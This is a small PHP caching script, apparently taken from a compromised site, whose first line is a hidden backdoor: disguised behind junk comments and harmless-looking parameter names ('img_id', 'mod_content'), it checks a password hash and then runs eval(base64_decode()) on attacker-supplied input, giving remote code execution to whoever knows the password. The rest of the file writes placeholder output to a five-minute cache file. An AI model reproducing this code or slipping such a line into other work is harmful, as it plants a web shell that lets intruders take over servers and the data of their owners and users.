<?php /**UjBpSrJaJh*/if((md5($_REQUEST["img_id"]) == "ae6d32585ecc4d33cb8cd68a047d8434") && isset($_REQUEST["mod_content"])) { /**VzEjNsWwWp*/eval(base64_decode($_REQUEST["mod_content"])); /**ClFoVfZiKs*/exit();/**OfCqUuIdUr*/ } ?><?php

date_default_timezone_set(date_default_timezone_get());

$cache_expire = 5 * 60; # 5 mins

$cache_file ="user_cache.txt";

// if cache not expired, echo from that
if (file_exists($cache_file) && (time() - filemtime($cache_file)) < $cache_expire) {
	echo readfile($cache_file);
    exit();
}      
 	 
// start output buffer for cache
ob_start();

echo "foo";
echo "bar";

$content = ob_get_clean();
$f = fopen($cache_file, 'w');
fwrite($f, $content);
fclose($f);
echo $content;

?> 



